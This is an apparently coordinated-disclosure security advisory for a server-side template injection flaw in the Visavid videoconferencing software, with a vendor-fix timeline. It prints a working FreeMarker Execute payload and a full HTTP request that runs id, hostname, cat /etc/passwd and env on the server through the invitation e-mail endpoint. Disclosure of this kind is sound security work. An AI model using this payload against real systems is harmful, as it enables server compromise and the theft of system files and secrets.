---
layout: post
date:   2021-04-27
categories: [advisory]

title:  "Advisory - Visavid remote code execution via SSTI"
advisory:
  product: Visavid
  homepage: https://visavid.de/
  
  vulnerable_version: ["Gateway 1.10.2", "Verwaltung: 1.10.6"]
  fixed_version: ["Gateway 1.10.3", "Verwaltung: 1.10.14"]
  impact_text: HIGH
  impact_score: 8.8
  cvss: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  found: 2021-04-19
---

# Product description
Kommunizieren, präsentieren, fortbilden: Unsere flexible Videokonferenz-Software ist von der Entwicklung bis zum Support zu 100 % Made in Germany und bietet neben Datenschutz und einem hohen Sicherheits-Level auch individuelle Anpassungsmöglichkeiten für unterschiedliche Einsatzbereiche.

[Auctores - visavid](https://auctores.de/software/produkte/)

# Vulnerability overview
The software `visavid` allows an `room` admin to invite other participants via E-Mail messages. After submitting the message it is processed by the `Java` templating engine [FreeMarker](https://freemarker.apache.org/) to create a message with some dynamic data in it. There are some tags listed on the website which can be used. As the user input is not properly validated it is possible to include arbitrary tags and execute code on the server side.

# Proof of concept
The endpoint `/api/verwaltung/rooms/subscriber/nachricht/{uuid}` allows an user to send an invitation E-Mail to other attendees. Both the `subject` and the `body` parameter are processed via the templating engine on the server side. This allows an attacker to execute code on the server using the payload 

```freemarker
<#assign ex=\"freemarker.template.utility.Execute\"?new()>
```


The following requests executes different commands (`id`, `hostname`, `cat /etc/passwd`, `env`):
```http
POST /api/verwaltung/rooms/subscriber/nachricht/{UUID} HTTP/1.1
Host: app.visavid.de
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/hal+json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: Bearer XXX
Content-Length: 521
Origin: https://app.visavid.de
DNT: 1
Connection: close

{
    "signatur": "<p>Informationen nach Art. 13 DSGVO in Bezug auf Visavid finden Sie unter <a href=\"https://visavid.de/datenschutz#Informationspflichten\">https://visavid.de/datenschutz#Informationspflichten</a>.</p>",
    "body": "<p>Einladung:</p>\n<p><#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") } \n ${ ex(\"hostname\")} \n ${ ex(\"cat /etc/passwd\")} \n ${ ex(\"env\")}</p>",
    "subject": "Einladung",
    "reply": "{EMAIL}",
    "absender": "{NAME}",
    "testaddress": "test-visavid@domain.test"
}
```
The resulting mail contains the output of the different commands:

![RCE result](/assets/visavid/210419-rce-email.png)

# Timeline
* 2021-04-19: Vendor contacted via security@, asked for a PGP Key / SMIME certificate to encrypt communication
* 2021-04-20: Response from vendor
* 2021-04-20: Report sent
* 2021-04-20: Vendor informed that a temporary hotfix has been applied
* 2021-04-26: Vendor informed that the issue is fixed
* 2021-04-27: Public release of security advisory


# Resources
* [PortSwigger Research - SSTI](https://portswigger.net/research/server-side-template-injection)
* [PortSwigger WebSecurity - SSTI](https://portswigger.net/web-security/server-side-template-injection)
* [PayloadAllTheThing - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)